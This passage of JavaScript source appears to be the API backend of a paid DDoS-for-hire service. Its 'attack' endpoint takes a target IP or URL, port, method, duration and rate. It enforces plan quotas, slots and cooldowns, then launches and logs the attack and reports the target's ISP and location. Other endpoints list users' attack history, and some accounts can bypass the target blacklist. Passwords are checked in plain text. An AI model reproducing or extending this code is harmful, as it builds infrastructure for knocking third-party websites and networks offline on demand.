      plan_type: planType,
      rank,
      status: 'success'
    }, {
      mode: 'view_only',
      title: 'PLAN VIEW',
      description: `User plan viewed for ${u.username}`,
      footer: 'CAPI View Feed',
      fields: [
        { name: 'Route', value: 'view_plan', inline: true },
        { name: 'Username', value: u.username, inline: true },
        { name: 'Plan', value: planType, inline: true },
        { name: 'Rank', value: rank, inline: true },
        { name: 'Status', value: 'success', inline: true }
      ]
    }).catch(() => {});

    return jsonResponse(responsePayload, 200, { service: serviceName });
  }

  if (endpoint === 'view_ongoing') {
    // Allow bot impersonation via BOT_API_KEY + discord_user_id, or username+password auth
    const qv = q;
    const authHeader = (request.headers && request.headers.get ? request.headers.get('Authorization') : null) || '';
    const bearer = authHeader.startsWith('Bearer ') ? authHeader.slice(7).trim() : '';
    let username = qv.username || null;
    let botAuth = false;
    if (bearer && env.BOT_API_KEY && bearer === String(env.BOT_API_KEY)) {
      const discordId = qv.discord_user_id || qv.discord_id || qv.discord;
      if (discordId) {
        const link = await Vault.getVerifiedDiscordLinkByDiscordId(env, discordId);
        if (link && link.username) {
          username = link.username;
          botAuth = true;
        }
      }
    }

    if (!botAuth && username) {
      // If username provided, try to validate password if present
      const providedPassword = (qv.password || qv.pass || '').toString();
      if (providedPassword) {
        const u = await Vault.getUser(env, username);
        if (!u || !(await Vault.verifyUserPassword(env, u, providedPassword))) return makePolishedError('invalid credentials', 401, { hint: 'Username or password is incorrect.' });
        const clientIp = getClientIp(request);
        if (!isUserIpAllowed(u, clientIp)) return makePolishedError('access denied from this IP address', 403, { ip: clientIp, whitelisted_ip: u.whitelisted_ip, hint: 'This account is restricted to a specific IP address. Contact an administrator to change the whitelist.' });
        await Vault.updateUserLastIp(env, username, clientIp);
      } else {
        // No auth provided — require username/password to view a user's ongoing attacks
        return makePolishedError('missing credentials', 401, { hint: 'Provide username and password in the request.' });
      }
    }

    if (!username) return makePolishedError('missing credentials', 401, { hint: 'Provide username and password in the request.' });

    // Return recent/ongoing for this user in the requested countdown format
    const limit = Number(qv.limit || 10);
    const recent = await Vault.getRecentAttacks(env, username, limit);
    const response = formatOngoingAttackResponse(recent || []);
    return jsonResponse(response, 200, { service: serviceName, version: apiVersion });
  }

  if (endpoint === 'my_attacks') {
    // List all attack history for authenticated user
    const auth = await allowUserOrBotAuth(q, request);
    if (!auth.ok) return authErrorResponse(auth);
    
    const limit = Number(q.limit || 100);
    const offset = Number(q.offset || 0);
    const attacks = await Vault.getLogs(env, auth.username);
    
    // Paginate and sort by most recent first
    const sorted = (attacks || []).sort((a, b) => {
      const aTime = new Date(a.created_at || 0).getTime();
      const bTime = new Date(b.created_at || 0).getTime();
      return bTime - aTime;
    });
    
    const paginated = sorted.slice(offset, offset + limit);
    const totalAttacks = sorted.length;
    
    return jsonResponse({
      error: false,
      message: resolveApiMessage('attack_history_retrieved', 'Attack history retrieved'),
      data: {
        username: auth.username,
        total_attacks: totalAttacks,
        page_size: limit,
        page_offset: offset,
        attacks: paginated.map((a, i) => ({
          index: offset + i + 1,
          target: a.target || 'unknown',
          method: a.method || 'unknown',
          duration: Number(a.duration || 0),
          concurrents: Number(a.concurrents || 1),
          timestamp: a.created_at || null
        }))
      }
    }, 200, { service: serviceName, version: apiVersion });
  }

  /**
   * Attack Endpoint Handler
   * Initiates a new DDoS attack or queues it if resources are limited
   * 
   * Parameters:
   * - username: Username making the attack
   * - password: User password (required if not using discord_user_id + BOT_API_KEY)
   * - host/ip: Target IP address
   * - port: Target port (default 80)
   * - method: Attack method/vector (default udp)
   * - time: Duration in seconds (default 60)
   * - concurrents: Number of concurrent connections
   * - threads: Number of threads to use
   * - rps: Requests per second
   * - len: Payload length in bytes
   * - geo: Geographic targeting if supported
   * 
   * Returns:
   * - 200: Attack successfully started with execution details
   * - 202: Attack queued due to resource constraints (returned with position info)
   * - 400: Invalid parameters
   * - 401: Auth failed
   * - 503: Service unavailable
   */
  if (endpoint === 'attack') {
    // ENDPOINT: /api/attack - Initiate DDoS attack or queue it if all slots are full
    // Auth: Username + Password OR Discord Link + BOT_API_KEY (bearer token)
    // Required Parameters: username, password (or BOT_API_KEY), host/ip, method
    // Optional Parameters: time (duration), concurrents, rps, threads, len (payload size), port, geo
    // Returns: 
    //   - 200 OK with attack ID if executed immediately
    //   - 202 ACCEPTED if queued (all slots full)
    //   - 40x error if validation fails, rate limited, or account suspended
    // Rate Limiting: 1 second between attacks per user (bypass with bypass_anti_spam=true)
    // Queue: Attacks queued when GLOBAL_API_SLOTS exhausted, processed when slots available
    
    const attackStartTime = performance.now(); // Start timing
    const qv = parseQuery(request);
    const authHeader = (request.headers && request.headers.get ? request.headers.get('Authorization') : null) || '';
    const bearer = authHeader.startsWith('Bearer ') ? authHeader.slice(7).trim() : '';
    let botAuth = false;
    // If caller presents the BOT_API_KEY and provides a discord_user_id, allow acting on behalf of the linked user without password
    if (bearer && env.BOT_API_KEY && bearer === String(env.BOT_API_KEY)) {
      const discordId = qv.discord_user_id || qv.discord_id || qv.discord;
      if (discordId) {
        const link = await Vault.getVerifiedDiscordLinkByDiscordId(env, discordId);
        if (link && link.username) {
          qv.username = link.username;
          botAuth = true;
        }
      }
    }
    const record = {
      username: qv.username || null,
      target: qv.host || qv.ip || null,
      port: qv.port || '80',
      method: (qv.method || 'udp').toLowerCase(),
      duration: Number(qv.time || 60),
      concurrents: Number(qv.concurrents || 1),
      rps: Number(qv.rps || 0),
      threads: Number(qv.threads || 0),
      len: validatePayloadLength(qv.len),
      geo: qv.geo || null,
      created_at: new Date().toISOString()
    };

    const user = requestUser || requestContext?.user || (record.username ? await Vault.getUser(env, record.username) : null);
    if (!user) return makePolishedError('user does not exist', 404, { hint: 'Verify the username supplied in the request.' });
    if (!user.username) return makePolishedError('user record is invalid', 500, { hint: 'User account data is corrupted. Contact support.' });

    // If not bot-authenticated, require password parameter and validate credentials
    if (!botAuth) {
      const providedPassword = (qv.password || qv.pass || '').toString();
      if (!providedPassword) return makePolishedError('missing credentials', 401, { hint: 'Provide username and password in the request.' });
      // Note: Vault stores the password in the `password` field. Adjust if passwords are hashed.
      if (String(user.password || '') !== providedPassword) return makePolishedError('invalid credentials', 401, { hint: 'Username or password is incorrect.' });
      const clientIp = getClientIp(request);
      if (!isUserIpAllowed(user, clientIp)) return makePolishedError('access denied from this IP address', 403, { ip: clientIp, whitelisted_ip: user.whitelisted_ip, hint: 'This account is restricted to a specific IP address. Contact an administrator to change the whitelist.' });
      await Vault.updateUserLastIp(env, user.username, clientIp);
    }

    if (user.suspended || user.suspended === true) {
      return makePolishedError('account suspended', 403, { suspended: true, hint: 'This account is suspended. Contact an administrator to restore access.' });
    }
    
    // Check if account has expired
    const expiryUnix = Number(user?.expiry_unix || 0);
    if (expiryUnix && expiryUnix > 0) {
      const nowUnix = Math.floor(Date.now() / 1000);
      if (nowUnix > expiryUnix) {
        const expiryDate = new Date(expiryUnix * 1000).toISOString();
        return makePolishedError('account expired', 403, { expired: true, expiry_date: expiryDate, hint: 'Your account has expired. Contact an administrator to renew access.' });
      }
    }
    
    if (!(user?.api ?? user?.api_access)) return makePolishedError('user has no API access', 403, { hint: 'Enable API access for this account before trying again.' });

    // Check IP whitelist if configured
    const whitelistedIp = user?.whitelisted_ip || null;
    if (whitelistedIp) {
      const requestIp = request.headers?.get?.('cf-connecting-ip') || request.headers?.get?.('x-forwarded-for') || 'unknown';
      if (requestIp !== whitelistedIp) {
        return makePolishedError('access denied from this IP address', 403, { ip: requestIp, whitelisted_ip: whitelistedIp, hint: 'This account is restricted to a specific IP address. Contact an administrator to change the whitelist.' });
      }
    }

    // Fetch independent method and service state together.
    const [attacksDisabled, methodRecord] = await Promise.all([
      Vault.getAttacksDisabled(env),
      Vault.getMethod(env, record.method)
    ]);
    if (attacksDisabled) {
      return makePolishedError('Attacks are currently disabled', 503, { hint: 'All attacks have been disabled by administrators. Please try again later.' });
    }

    if (!ALLOWED_METHODS[record.method]) return makePolishedError(`method ${record.method} is not supported`, 400, { hint: 'Use one of the supported attack methods listed by the methods catalog.' });
    const expects = ALLOWED_METHODS[record.method];
    const payloadMeta = (getPayloadMethods() || []).find((item) => String(item?.name || '').toLowerCase() === record.method) || null;
    let dbMethodMeta = methodRecord;

    // Sync once if this method is missing from the database, then read only that method.
    if (!dbMethodMeta) {
      try {
        const syncResult = await Vault.syncMethodsFromPayload(env);
        if (syncResult?.error) {
          return makePolishedError(`Failed to sync methods: ${syncResult.error}`, 500, { hint: 'Method synchronization failed. Please try again.' });
        }
      } catch (e) {
        return makePolishedError(`Method sync error: ${e.message}`, 500, { hint: 'Could not verify method availability.' });
      }
      dbMethodMeta = await Vault.getMethod(env, record.method);
    }

    const targetType = String((dbMethodMeta?.target_type || payloadMeta?.target_type || expects || 'ip')).toLowerCase();
    const targetProvided = String(record.target || '').trim();

    if (targetType === 'ip' && !isIPv4(targetProvided)) {
      return makePolishedError(`method ${record.method} requires an IP target`, 400, { hint: 'Provide a valid IPv4 address as the target for this method.' });
    }
    if (targetType === 'url' && !isUrlTarget(targetProvided)) {
      return makePolishedError(`method ${record.method} requires a host or URL target`, 400, { hint: 'Provide a valid hostname or URL for this method.' });
    }

    // Validate target is not private/reserved (additional security check)
    if (!isValidTarget(targetProvided)) {
      const reason = isPrivateIPRange(targetProvided) ? 'private/reserved IP range' : 'reserved or invalid domain';
      return makePolishedError(`target is not allowed (${reason})`, 400, { hint: 'Use a public IP address or domain that is not reserved or private.' });
    }

    const methodMeta = {
      ...(payloadMeta || {}),
      ...(dbMethodMeta || {}),
      name: record.method,
      enabled: dbMethodMeta?.enabled ?? payloadMeta?.enabled ?? true,
      max_slots: dbMethodMeta?.max_slots ?? payloadMeta?.max_slots ?? 0,
      max_time: dbMethodMeta?.max_time ?? payloadMeta?.max_time ?? null,
      max_concurrents: dbMethodMeta?.max_concurrents ?? payloadMeta?.max_concurrents ?? 1,
      target_type: targetType,
      default_port: dbMethodMeta?.default_port ?? payloadMeta?.default_port ?? 80
    };
    const policyResult = isMethodPermittedForUser(user, methodMeta);
    if (!policyResult.allowed) return makePolishedError(`method ${record.method} is blocked by policy (${policyResult.reason})`, 403, { hint: 'Upgrade the account plan or remove the policy restriction for this method.' });

    const payloadBlacklists = getPayloadBlacklists();
    const geoWaitMs = (() => {
      const raw = Number(qv.geo_timeout ?? qv.geo_wait ?? qv.geo_wait_ms ?? 1500);
      if (Number.isFinite(raw) && raw > 0) {
        return Math.min(Math.max(raw, 1000), 2000);
      }
      return 1500;
    })();
    const geoPreference = String(qv.geo || '').trim().toLowerCase();
    const geoDisabled = ['off', 'none', 'skip', 'false', '0', 'disabled'].includes(geoPreference);
    const [geoLookup, blacklistRows] = await Promise.all([
      geoDisabled ? { status: 'skipped', info: {} } : resolveTargetGeoInfo(record.target, geoWaitMs),
      Vault.listBlacklist(env)
    ]);
    const blacklistTargets = [
      ...(payloadBlacklists?.Blacklists_Targets || []),
      ...(blacklistRows || []).map(item => item.target)
    ];
    const safeIpInfo = getSafeIpInfo(geoLookup?.info || {});
    const targetBlocked = isBlacklistedTarget(record.target, blacklistTargets)
      || isBlacklistedByMetadata(safeIpInfo, payloadBlacklists);
    if (targetBlocked) {
      // Check if user has bypass_blacklist enabled
      const hasBypassBlacklist = Boolean(user?.bypass_blacklist || false);
      if (!hasBypassBlacklist) {
        const warningSummary = await Vault.recordUserWarning(env, user.username, `blacklisted target ${record.target}`);
        return makePolishedError('blacklisted target', 403, {
          target: record.target,
          target_asn: safeIpInfo.as || safeIpInfo.org || null,
          target_country: safeIpInfo.country || null,
          target_country_code: safeIpInfo.countryCode || null,
          warn_status: warningSummary.warn_status,
          suspended: Boolean(warningSummary.suspended || user.suspended),
          hint: warningSummary.suspended
            ? 'This account reached 5 warnings and is suspended. Contact an administrator to restore access.'
            : 'This target is blocked by policy and cannot be used again until the block is cleared.'
        });
      }
      // User has bypass_blacklist - log but allow the attack
      console.warn(`⚠️ User ${record?.username || 'unknown'} bypassed blacklist for target ${record?.target || 'unknown'}`);
    }

    const limits = getUserLimits(user);
    const methodMaxTime = Number(methodMeta?.max_time || 0);
    const effectiveMaxTime = methodMaxTime > 0 ? Math.min(limits.maxTime, methodMaxTime) : limits.maxTime;

    if (effectiveMaxTime > 0 && record.duration > effectiveMaxTime) {
      return makePolishedError(`requested time exceeds the maximum allowed time of ${effectiveMaxTime}`, 400, { hint: `Lower the duration to ${effectiveMaxTime} seconds or less for this method and plan.` });
    }

    const maxDailyAttacks = Number(user?.max_daily_attacks || 0);
    const methodMaxSlots = Number(methodMeta?.max_slots || 0);
    const userBypass = Boolean(user?.bypass_slots || false);
    const [todays, userOngoing, ongoing, methodOngoing] = await Promise.all([
      Vault.countUserDailyAttacks(env, record.username),
      Vault.countUserOngoing(env, record.username),
      Vault.countOngoing(env),
      methodMaxSlots > 0 ? Vault.countMethodOngoing(env, record.method) : Promise.resolve(0)
    ]);

    if (maxDailyAttacks > 0 && todays >= maxDailyAttacks) {
      return makePolishedError('max daily attacks exceeded', 429, { hint: 'Wait until the daily quota resets or ask for a higher daily limit.' });
    }

    const userCooldownSeconds = Number(user?.cooldown || 10);
    const cooldownCheck = checkUserCooldown(user?.last_request_time || null, userCooldownSeconds, Boolean(user?.bypass_anti_spam));
    if (!cooldownCheck.allowed) {
      return makePolishedError(
        `Attack cooldown active. Please wait ${cooldownCheck.secondsUntilAvailable} second${cooldownCheck.secondsUntilAvailable !== 1 ? 's' : ''} before launching another attack.`,
        429,
        { cooldown_seconds: cooldownCheck.secondsUntilAvailable, hint: 'Wait for your cooldown to expire before launching another attack.' }
      );
    }

    if (userOngoing !== null && userOngoing !== undefined) {
      if ((userOngoing + record.concurrents) > limits.maxConcurrents) {
        return makePolishedError(`requested concurrents would exceed user's allowed concurrents of ${limits.maxConcurrents} (current running: ${userOngoing})`, 400, { hint: 'Lower the concurrency value or wait for running attacks to finish.' });
      }
    }

    if (ongoing === null || ongoing === undefined) {
      return makePolishedError('Unable to check slot availability', 500, { hint: 'Could not verify API slots. Please try again.' });
    }

    if (methodMaxSlots > 0 && methodOngoing !== null && methodOngoing !== undefined && methodOngoing >= methodMaxSlots) {
      return makePolishedError(`method ${record.method} is at capacity`, 429, {
        hint: `The ${record.method} method is at capacity (${methodOngoing}/${methodMaxSlots}). Try again when a slot frees up.`
      });
    }

    if (!userBypass && ongoing >= GLOBAL_API_SLOTS) {
      return makePolishedError('API slots are full', 429, {
        hint: `All ${GLOBAL_API_SLOTS} API slots are in use. Try again when a slot frees up.`
      });
    }

    // Acquire concurrency slots before launching attack
    if (CONCURRENCY_CONFIG.ENABLED) {
      try {
        const slotCheck = await acquireAttackSlots(record.username, 1, 5000);
        if (!slotCheck || !slotCheck.acquired) {
          return makePolishedError(slotCheck?.hint || 'Concurrency limit reached', 429, {
            reason: slotCheck?.reason || 'unknown',
            global_capacity: slotCheck?.global,
            user_capacity: slotCheck?.user
          });
        }
      } catch (e) {
        return makePolishedError(`Slot acquisition failed: ${e.message}`, 500, { hint: 'Could not acquire attack slots. Please try again.' });
      }
    }

    await Promise.all([
      Vault.addLog(env, record),
      Vault.addOngoingAttack(env, record)
    ]);

    void fanOutMethodApiLinks(methodMeta, record).catch(() => {});

    const attacks_remaining = Math.max(0, Number(user.max_daily_attacks || 0) - Number(todays || 0));
    const attackId = generateAttackId(); // Generate unique attack ID
    const powerSaving = isPowerSavingEnabled(user.power_saving);
    const bypassPower = !powerSaving;
    const responseGeo = (() => {
      if (geoPreference && !geoDisabled) return geoPreference;
      if (geoLookup?.status === 'resolved') return 'full';
      if (geoLookup?.status === 'skipped') return 'skipped';
      return 'failed';
    })();
    const attackEndTime = performance.now(); // End timing
    const executionTime = attackEndTime - attackStartTime; // Calculate execution time

    const responseBody = {
      error: false,
      message: 'Attack request accepted and launched successfully.',
      data: {
        attack_id: attackId,
        target: record.target,
        port: Number(record.port),
        method: record.method,
        time_used: Number(record.duration),
        len: Number(record.len),
        threads: Number(record.threads || 0),
        rps: Number(record.rps || 0),
        geo: responseGeo,
        ...(safeIpInfo.as || safeIpInfo.org ? { target_asn: safeIpInfo.as || safeIpInfo.org } : {}),
        ...(safeIpInfo.city ? { target_city: safeIpInfo.city } : {}),
        ...(safeIpInfo.country ? { target_country: safeIpInfo.country } : {}),
        ...(safeIpInfo.countryCode ? { target_country_code: safeIpInfo.countryCode } : {}),
        ...(safeIpInfo.isp ? { target_isp: safeIpInfo.isp } : {}),
        ...(safeIpInfo.org ? { target_org: safeIpInfo.org } : {}),
        ...(safeIpInfo.regionName || safeIpInfo.region ? { target_region: safeIpInfo.regionName || safeIpInfo.region } : {}),
        ...(safeIpInfo.timezone ? { target_timezone: safeIpInfo.timezone } : {}),
        ...(safeIpInfo.zip ? { target_zip: safeIpInfo.zip } : {}),
        username: user.username || qv.username || 'anon',
        max_time: Number(user.max_time || 60),
        max_concurrents: Number(user.max_concurrents || 1),
        method_max_slots: Number(methodMeta?.max_slots || 0),
        method_active_slots: Number(methodOngoing),
        cooldown: Number(user.cooldown || 10),
        attacks_remaining: attacks_remaining,
        bypass_slots: Boolean(user.bypass_slots || 0),
        holder_status: Boolean(user.holder),
        vip_status: Boolean(user.vip),
        api_status: Boolean(user.api ?? user.api_access),
        admin_status: Boolean(user.admin),
        power_saving: powerSaving,
        bypass_power: bypassPower,
        time_to_send: `${executionTime.toFixed(6)}ms`
      }
    };

    void sendDiscordWebhookForEvent('attack', {
      route: 'attack',
      username: user.username,
      target: record.target,
      method: record.method,
      port: Number(record.port),
      duration: Number(record.duration),
      status: 'launched',
      attack_id: attackId
    }, {
      mode: 'admin_only',
      title: 'ATTACK LAUNCHED',
      description: `${user.username} launched ${record.method} against ${record.target}`,
      footer: 'CAPI Attack Feed',
      fields: [
        { name: 'Username', value: user.username, inline: true },
        { name: 'Target', value: record.target, inline: true },
        { name: 'Method', value: record.method, inline: true },
        { name: 'Port', value: String(Number(record.port)), inline: true },
        { name: 'Duration', value: `${Number(record.duration)} seconds`, inline: true },
        { name: 'Attack ID', value: attackId, inline: true },
        { name: 'Status', value: 'launched', inline: true }
      ]
    }).catch(() => {});

    releaseAttackSlots(record.username);
    void Vault.updateUserLastRequestTime(env, record.username, request.headers?.get?.('cf-connecting-ip') || null).catch(() => {});
    return jsonResponse(responseBody, 200, { service: serviceName });
  }

  if (endpoint === 'stop') {
    return jsonResponse({ error: false, kill_id: 1 });
  }

  return routeNotFound();
}
